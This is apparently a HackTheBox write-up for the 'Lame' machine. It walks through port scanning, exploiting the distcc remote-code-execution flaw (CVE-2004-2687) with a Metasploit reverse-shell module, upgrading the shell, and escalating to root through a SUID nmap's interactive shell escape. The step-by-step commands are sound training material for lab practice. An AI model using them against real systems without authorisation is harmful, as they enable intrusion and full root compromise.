# HTB — Lame

**Difficulty:** Easy
**OS:** Linux
**CVE:** CVE-2004-2687 (distcc)

---

## Phase Recon

Confirmed the target was up, then ran a full port scan with service and OS detection:

```bash
nmap -sS -sV -O -p- 10.xx.xx.xx
```

Discovered the following open ports:

| Port | Service |
|------|---------|
| 21 | FTP (vsftpd) |
| 22 | SSH (OpenSSH) |
| 139 / 445 | SMB (Samba) |
| 3632 | distcc |

Used `searchsploit` to research the service running on port 3632 (distccd), which revealed a known remote code execution vulnerability.

---

## Phase Exploit

Loaded the Metasploit module `exploit/unix/misc/distcc_exec` with the `payload/cmd/unix/reverse_perl` payload and executed against the target. This returned a **dumb shell** as the `daemon` user.

Upgraded to a full TTY using Python:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Confirmed user context with `whoami`, which returned `daemon`.

Navigated to `/home/makis` and retrieved the user flag.

```bash
cd /home/makis
cat user.txt
# Flag redacted
```

---

## Phase Privilege Escalation

Ran a SUID binary search:

```bash
find / -perm -u=s -type f 2>/dev/null
```

The output included `/usr/bin/nmap`. Checked the version:

```bash
nmap --version
# nmap 4.53
```

Nmap versions below 5.21 support interactive mode, which allows a shell escape. Since the binary has the SUID bit set, the spawned shell inherits root privileges:

```bash
nmap --interactive
!sh
whoami
# root
```

Retrieved the root flag from `/root/root.txt`.

```bash
cat /root/root.txt
# Flag redacted
```

---

## Key Takeaways

- Always enumerate all ports — port 3632 (distcc) is frequently overlooked but was the direct entry point here
- SUID binary enumeration with `find / -perm -u=s` should be one of the first post-exploitation steps
- Nmap's `--interactive` escape is a classic GTFOBins path; version check (`< 5.21`) is required to confirm exploitability
